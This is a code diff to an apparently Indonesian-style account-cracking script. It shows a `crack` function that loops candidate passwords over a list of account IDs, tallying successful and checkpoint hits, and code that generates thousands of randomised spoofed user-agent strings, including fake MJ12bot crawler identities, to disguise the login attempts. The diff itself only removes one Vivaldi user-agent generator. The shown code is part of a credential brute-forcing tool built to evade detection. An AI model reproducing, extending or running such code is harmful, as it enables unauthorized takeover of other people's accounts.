@@ -48,6 +48,7 @@ def jalan(z):
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.03)
+		
 for xd in range(10000):
 	aa='Mozilla/5.0 (kompatibel; MJ12bot'
 	b=random.choice(['6','7','8','9','10','11','12'])
@@ -63,21 +64,6 @@ for xd in range(10000):
 	l='http://www.majestic12.co.uk/bot.php?+)'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-	
-	aa='Mozilla/5.0 (X11; Linux x86_64)'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Vivaldi '
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Safari/537.36 Vivaldi/5.5.2805.42'
-	ua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen2.append(ua)
 def uaku():	
 
 	try:
@@ -722,7 +708,6 @@ def crack(idf,pwv):
 	sys.stdout.write(f"\r crack {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua =random.choice(ugen)
-	ua2 =random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
